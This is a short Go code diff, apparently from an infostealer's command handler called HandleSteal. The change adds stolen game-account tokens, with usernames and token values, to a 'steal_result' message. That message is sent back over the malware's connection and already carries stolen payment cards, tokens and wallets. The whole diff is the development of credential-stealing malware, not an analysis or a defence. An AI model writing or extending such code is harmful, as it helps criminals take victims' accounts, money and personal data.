@@ -58,6 +58,16 @@ func HandleSteal(ctx context.Context, env *rt.Env, cmdID string) error {
 		})
 	}
 
+	gameTokens := make([]wire.StealGameToken, 0, len(r.GameTokens))
+	for _, g := range r.GameTokens {
+		gameTokens = append(gameTokens, wire.StealGameToken{
+			Game:     g.Game,
+			Type:     g.Type,
+			Username: g.Username,
+			Value:    g.Value,
+		})
+	}
+
 	return wire.WriteMsg(ctx, env.Conn, wire.StealResult{
 		Type:        "steal_result",
 		CommandID:   cmdID,
@@ -66,6 +76,7 @@ func HandleSteal(ctx context.Context, env *rt.Env, cmdID string) error {
 		Cards:       cards,
 		Tokens:      r.Tokens,
 		Wallets:     wallets,
+		GameTokens:  gameTokens,
 		Errors:      r.Errors,
 	})
 }
